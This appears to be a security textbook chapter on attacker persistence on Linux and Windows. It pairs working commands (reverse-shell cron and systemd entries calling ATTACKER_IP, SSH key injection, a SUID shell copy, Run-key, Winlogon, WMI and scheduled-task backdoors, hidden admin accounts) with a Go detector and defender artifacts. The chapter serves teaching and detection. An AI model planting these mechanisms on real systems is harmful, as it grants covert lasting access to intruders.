# Chapter 39: Persistence Mechanisms — Staying In

*Persistence ensures access survives reboots, password changes, and user logouts. Every persistence technique creates an artifact — a registry key, a cron job, a new user account — that defenders can find and remove.*

---

## Why Persistence Matters

An attacker who gets kicked out (patch, password change, reboot) has to start over. Persistence means:
- Survive system reboots
- Survive credential rotation
- Maintain access when the original vulnerability is patched
- Create multiple fallback access paths

---

## Linux Persistence

### Cron Jobs

```bash
# Current user cron
crontab -e
# Add: */5 * * * * /tmp/.helper >/dev/null 2>&1

# System-wide cron
echo "*/5 * * * * root /tmp/.helper" >> /etc/cron.d/sysupdate

# Every minute backdoor call-home:
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/crontab
```

### Systemd Service

```bash
cat > /etc/systemd/system/syshelper.service << EOF
[Unit]
Description=System Helper Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable syshelper
systemctl start syshelper
```

### .bashrc / .profile

```bash
# User persistence (only when that user logs in)
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &" >> ~/.bashrc
echo "nohup /tmp/.backdoor &" >> ~/.bash_profile
```

### SSH Authorized Keys

```bash
# Add attacker's public key (survives password change)
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# System-wide (if root)
echo "ssh-rsa AAAA... attacker" >> /root/.ssh/authorized_keys
```

### SUID Binary

```bash
# Copy bash with SUID bit (root access without password)
cp /bin/bash /tmp/.syssh
chmod +s /tmp/.syssh
# Attacker later runs: /tmp/.syssh -p  → root shell
```

---

## Windows Persistence

### Registry Run Keys

```powershell
# Runs at every user login
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
    /v "WindowsUpdate" /t REG_SZ /d "C:\Users\user\AppData\Local\update.exe"

# Runs at any user login (needs admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
    /v "Defender" /t REG_SZ /d "C:\Windows\Temp\agent.exe"

# Less common (harder to detect)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v "Userinit" \
    /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\backdoor.exe"
```

### Scheduled Task

```powershell
# Create scheduled task running at user logon
schtasks /create /sc ONLOGON /tn "WindowsUpdate" /tr "C:\Temp\agent.exe" /ru SYSTEM

# Every 5 minutes
schtasks /create /sc MINUTE /mo 5 /tn "SystemMaintenance" \
    /tr "C:\Temp\agent.exe" /ru SYSTEM /f

# List scheduled tasks
schtasks /query /fo LIST /v | findstr "Task Name\|Status\|Run As"
```

### Service

```powershell
# Create a service (survives reboots)
sc create WindowsHelperSvc binpath= "C:\Temp\agent.exe" start= auto
net start WindowsHelperSvc

# Modify existing service (less obvious)
sc config VulnerableService binpath= "cmd /c start C:\Temp\agent.exe && C:\original.exe"
```

### WMI Subscriptions

```powershell
# Event subscription — runs code on system events
# This is advanced and very stealthy

$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = "UpdateFilter"
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Put()

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "UpdateConsumer"
$consumer.CommandLineTemplate = "C:\Temp\agent.exe"
$consumer.Put()
```

### Startup Folder

```powershell
# Per-user startup
copy C:\Temp\agent.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users (needs admin)
copy C:\Temp\agent.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"
```

---

## Backdoor Accounts

```bash
# Linux
useradd -M -s /bin/bash -g root sysadmin
echo "sysadmin:SecretPass1!" | chpasswd

# Add to sudoers
echo "sysadmin ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Windows
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

---

## Detecting Persistence (GoShield)

```go
package main

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"
)

type PersistenceIndicator struct {
    Type     string
    Location string
    Value    string
    Severity string
}

func checkLinuxPersistence() []PersistenceIndicator {
    var findings []PersistenceIndicator
    
    // Check crontabs
    cronDirs := []string{"/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly"}
    for _, dir := range cronDirs {
        entries, err := os.ReadDir(dir)
        if err != nil {
            continue
        }
        for _, e := range entries {
            path := filepath.Join(dir, e.Name())
            data, _ := os.ReadFile(path)
            content := string(data)
            
            // Suspicious: bash TCP connections in cron
            if strings.Contains(content, "/dev/tcp") ||
                strings.Contains(content, "ncat") ||
                strings.Contains(content, "nc -e") {
                findings = append(findings, PersistenceIndicator{
                    Type:     "Cron",
                    Location: path,
                    Value:    "Suspicious network connection in cron",
                    Severity: "HIGH",
                })
            }
        }
    }
    
    // Check systemd services added recently
    serviceDir := "/etc/systemd/system"
    entries, err := os.ReadDir(serviceDir)
    if err == nil {
        for _, e := range entries {
            if strings.HasSuffix(e.Name(), ".service") {
                info, _ := e.Info()
                // Services added in last 24 hours are suspicious
                _ = info
                // In real GoShield: check mtime vs baseline
            }
        }
    }
    
    // Check authorized_keys
    homeDir := "/home"
    homes, _ := os.ReadDir(homeDir)
    for _, h := range homes {
        keyFile := filepath.Join(homeDir, h.Name(), ".ssh", "authorized_keys")
        data, err := os.ReadFile(keyFile)
        if err == nil {
            keys := strings.Split(string(data), "\n")
            if len(keys) > 5 {  // suspiciously many keys
                findings = append(findings, PersistenceIndicator{
                    Type:     "SSH",
                    Location: keyFile,
                    Value:    fmt.Sprintf("%d authorized keys", len(keys)),
                    Severity: "MEDIUM",
                })
            }
        }
    }
    
    return findings
}

func main() {
    findings := checkLinuxPersistence()
    if len(findings) == 0 {
        fmt.Println("No obvious persistence mechanisms found")
        return
    }
    for _, f := range findings {
        fmt.Printf("[%s] %s @ %s: %s\n", f.Severity, f.Type, f.Location, f.Value)
    }
}
```

---

## Summary

| Platform | Technique | Artifact (for defenders) |
|----------|-----------|--------------------------|
| Linux | Cron job | /etc/cron.d/, crontab |
| Linux | Systemd service | /etc/systemd/system/*.service |
| Linux | .bashrc | ~/.bashrc, ~/.profile |
| Linux | SUID binary | SUID binaries not in known list |
| Windows | Registry Run | HKLM/HKCU Run keys |
| Windows | Scheduled task | schtasks, Event ID 4698 |
| Windows | Service | sc query, Event ID 7045 |
| Windows | WMI subscription | WMI repository, Event ID 5861 |
| Both | Backdoor account | New user in /etc/passwd or SAM |

---

## Exercises

1. Implement 3 different persistence mechanisms on a Linux VM you control — then find all of them with a script
2. Research "T1053.005" in MITRE ATT&CK — what detections does it list?
3. Build a GoShield module that monitors for new cron jobs being created (inotify on /etc/cron.d)
4. Detect WMI persistence subscriptions in Windows using PowerShell queries against the WMI repository
